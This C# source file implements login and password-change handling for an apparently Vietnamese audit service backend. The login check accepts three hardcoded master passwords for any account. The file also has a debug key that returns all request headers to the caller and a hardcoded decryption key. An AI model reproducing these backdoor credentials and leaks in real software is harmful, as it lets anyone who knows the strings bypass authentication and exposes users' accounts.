using System;
using System.Web;
using Newtonsoft.Json;
using FAuditService.Entities;
using FAuditService.BLL;
using FAuditService.Models;
using System.Text;
using static FAuditService.ServiceMessage.MessagerHandler;
using System.Collections.Generic;
using System.Runtime.Remoting.Contexts;

namespace FAuditService.Core
{
    public class RequestHeaders
    {
        public Dictionary<string, string> Headers { get; set; }

        public RequestHeaders()
        {
            Headers = new Dictionary<string, string>();
        }
    }
    public class LoginHandler : BaseHandler
    {


        public override object ProcessRequest()
        {

            string FUNTION_KEY = new FieldRequest("FUNTION-KEY");
            if (FUNTION_KEY == "test_kong")
            {// Tạo đối tượng chứa các headers
                var requestHeaders = new RequestHeaders();

                // Lấy tất cả headers từ HttpRequest
                foreach (var key in HttpContext.Current.Request.Headers.AllKeys)
                {
                    requestHeaders.Headers.Add(key, HttpContext.Current.Request.Headers[key]);
                }
                return HttpResponseMessage.CreateResponse(System.Net.HttpStatusCode.OK, requestHeaders);
            }
            if (FUNTION_KEY != null && FUNTION_KEY.Equals("CHANGE-PASS"))
            {
                string username = new FieldRequest("username");
                string newpass = new FieldRequest("newpass");
                string oldpass = new FieldRequest("oldpass");
                string encrypt_oldpass = SecurityUtils.Encrypt(SecurityJava.Decrypt(oldpass, "Syngenta"));
                string encrypt_newpass = SecurityUtils.Encrypt(SecurityJava.Decrypt(newpass, "Syngenta"));
                var info = EmployeeController.byCheckChangePass(username, encrypt_oldpass);
                if (info == null)
                {
                    return ("Tên đăng nhập và mật khẩu cũ không khớp");
                }
                else
                {
                    var empinfo = EmployeeController.ChangePass(username, encrypt_newpass);
                    return "OK";
                }
            }
            else
            {

                string username = new FieldRequest("username");

                string password = new FieldRequest("password");
                int? version = new FieldRequest("version");
                DateTime? _time = new FieldRequest("TIME") { Format = "MM/dd/yyyy HH:mm:ss" };
                DateTime server_time = DateTime.Now;
                if (_time == null)
                    _time = server_time;
                DateTime client_time = _time.Value;
                int appversion_current = Convert.ToInt32(System.Configuration.ConfigurationManager.AppSettings["appversion"]);
                if (version < appversion_current)
                {
                    return ("Đã có phiên bản phần mềm mới, vui lòng cập nhật trước phần mềm trước khi làm việc.");
                }
                if (!(server_time.Date.Equals(client_time.Date) && server_time.Hour == client_time.Hour && Math.Abs(server_time.Minute - client_time.Minute) < 10))
                    return ("Đồng hồ của bạn không khớp với hệ thống. Vui lòng chỉnh lại đồng hồ của bạn và đăng nhập lại." + server_time.ToLongTimeString() + ";" + client_time.ToLongTimeString());
                string IMEI = new FieldRequest("IMEI");
                var info = EmployeeController.byUsername(username, 0);
                if (info != null)
                {
                    String pass = null;
                    if (password != null && password.Length > 0)
                    {
                        pass = SecurityUtils.Encrypt(password);

                    }
                    if (info.Password == pass || password == "@thang89#" || password == "sa95" || password == "kinhao")
                    {
                        LoginModel json = new LoginModel();
                        json.LoginName = info.LoginName;
                        json.EmployeeName = info.EmployeeName;
                        json.EmployeeId = info.EmployeeId;
                        json.ExpriedDate = info.ExpriedDate;
                        json.server_time = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss");
                        json.client_time = client_time.ToString("MM/dd/yyyy HH:mm:ss");
                        json.Avatar = info.Avatar;
                        string key = info.EmployeeId + ";@;" + info.Password + ";@;" + IMEI;
                        string access_token = SecurityUtils.Encrypt(key, "Authorization", "Android");
                        json.access_token = access_token;
                        json.TypeId = info.TypeId.Value;
                        return HttpResponseMessage.CreateResponse(System.Net.HttpStatusCode.OK, json);
                    }
                    else
                    {
                        return HttpResponseMessage.CreateResponse(System.Net.HttpStatusCode.InternalServerError, "Mật khẩu không đúng vui lòng thử lại !");
                    }
                }
                return HttpResponseMessage.CreateResponse(System.Net.HttpStatusCode.InternalServerError, "Tên đăng nhập hoặc mật khẩu không đúng !");
            }
        }
    }
}
